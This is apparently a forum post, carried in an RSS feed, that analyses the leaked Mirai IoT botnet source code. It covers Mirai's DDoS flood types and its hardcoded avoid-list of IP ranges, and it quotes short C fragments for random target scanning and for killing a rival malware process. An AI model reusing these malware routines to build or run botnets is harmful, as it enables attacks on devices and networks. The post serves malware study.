<p>One of Mirai’s key features is its ability to launch HTTP floods and various network-layer (OSI layer 3-4) DDoS attacks. It can execute GRE IP and GRE ETH floods, SYN and ACK floods, STOMP floods, DNS floods, and UDP flood attacks.</p>
<p>Interestingly, Mirai includes a hardcoded list of IPs that its bots are programmed to avoid during scans. This list, which you can find below, includes the US Postal Service, the Department of Defense, the Internet Assigned Numbers Authority (IANA) and IP ranges belonging to Hewlett-Packard and General Electric.</p>
<aside class="onebox githubblob" data-onebox-src="https://github.com/soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/scanner.c#L674">
  <header class="source">

      <a href="https://github.com/soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/scanner.c#L674" target="_blank" rel="noopener nofollow ugc">github.com</a>
  </header>

  <article class="onebox-body">
    <h4><a href="https://github.com/soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/scanner.c#L674" target="_blank" rel="noopener nofollow ugc">soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/scanner.c#L674</a></h4>



    <pre class="onebox"><code class="lang-c">
      <ol class="start lines" start="664" style="counter-reset: li-counter 663 ;">
          <li></li>
          <li>    addr.sin_family = AF_INET;</li>
          <li>    addr.sin_addr.s_addr = conn-&gt;dst_addr;</li>
          <li>    addr.sin_port = conn-&gt;dst_port;</li>
          <li></li>
          <li>    conn-&gt;last_recv = fake_time;</li>
          <li>    conn-&gt;state = SC_CONNECTING;</li>
          <li>    connect(conn-&gt;fd, (struct sockaddr *)&amp;addr, sizeof (struct sockaddr_in));</li>
          <li>}</li>
          <li></li>
          <li class="selected">static ipv4_t get_random_ip(void)</li>
          <li>{</li>
          <li>    uint32_t tmp;</li>
          <li>    uint8_t o1, o2, o3, o4;</li>
          <li></li>
          <li>    do</li>
          <li>    {</li>
          <li>        tmp = rand_next();</li>
          <li></li>
          <li>        o1 = tmp &amp; 0xff;</li>
          <li>        o2 = (tmp &gt;&gt; 8) &amp; 0xff;</li>
      </ol>
    </code></pre>



  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<p>I find this rather intriguing because one of the principles I always aimed to follow in software development, including malware, is to avoid hardcoding simple code. Yet, it’s fascinating that Mirai, despite its simplistic approach, was eventually used in one of the most prominent cyberattacks to date, Mirai even searches for and eliminates the competing IoT malware known as “Anime.” It does this by identifying the malware’s presence through its executable path and then terminating and removing it from the compromised device.</p>
<aside class="onebox githubblob" data-onebox-src="https://github.com/soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/killer.c#L187">
  <header class="source">

      <a href="https://github.com/soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/killer.c#L187" target="_blank" rel="noopener nofollow ugc">github.com</a>
  </header>

  <article class="onebox-body">
    <h4><a href="https://github.com/soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/killer.c#L187" target="_blank" rel="noopener nofollow ugc">soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/killer.c#L187</a></h4>



    <pre class="onebox"><code class="lang-c">
      <ol class="start lines" start="177" style="counter-reset: li-counter 176 ;">
          <li>ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));</li>
          <li></li>
          <li>// Store /proc/$pid/status into status_path</li>
          <li>ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));</li>
          <li>ptr_status_path += util_strcpy(ptr_status_path, file-&gt;d_name);</li>
          <li>ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_STATUS, NULL));</li>
          <li></li>
          <li>table_lock_val(TABLE_KILLER_PROC);</li>
          <li>table_lock_val(TABLE_KILLER_EXE);</li>
          <li></li>
          <li class="selected">// Resolve exe_path (/proc/$pid/exe) -&gt; realpath</li>
          <li>if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)</li>
          <li>{</li>
          <li>    realpath[rp_len] = 0; // Nullterminate realpath, since readlink doesn't guarantee a null terminated string</li>
          <li></li>
          <li>    table_unlock_val(TABLE_KILLER_ANIME);</li>
          <li>    // If path contains ".anime" kill.</li>
          <li>    if (util_stristr(realpath, rp_len - 1, table_retrieve_val(TABLE_KILLER_ANIME, NULL)) != -1)</li>
          <li>    {</li>
          <li>        unlink(realpath);</li>
          <li>        kill(pid, 9);</li>
      </ol>
    </code></pre>



  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<p>The goal of this is obvious Mirai maximize the attack potential of the botnet devices, “Rise Up And Kill Him First”, These offensive and defensive measures are common among malware authors.</p>
<p>In conclusion, these were some of the intriguing aspects I found within this source code. They underscore the delicate balance between the complexity and simplicity of malware development; achieving success in infiltrating advanced systems often doesn’t require advanced and sophisticated malware. Instead, it frequently comes down to human error and the art of social engineering. To this day, social engineering remains one of the most effective techniques for spreading malware or executing offensive operations.</p>
          <p><a href="https://0x00sec.org/t/malware-development-botnet-based/36818/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-botnet-based/36818/1</link>
        <pubDate>Wed, 06 Sep 2023 08:08:36 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-36818-1</guid>
        <source url="https://0x00sec.org/t/malware-development-botnet-based/36818.rss">Malware Development: Botnet-Based</source>
      </item>
  </channel>
</rss>
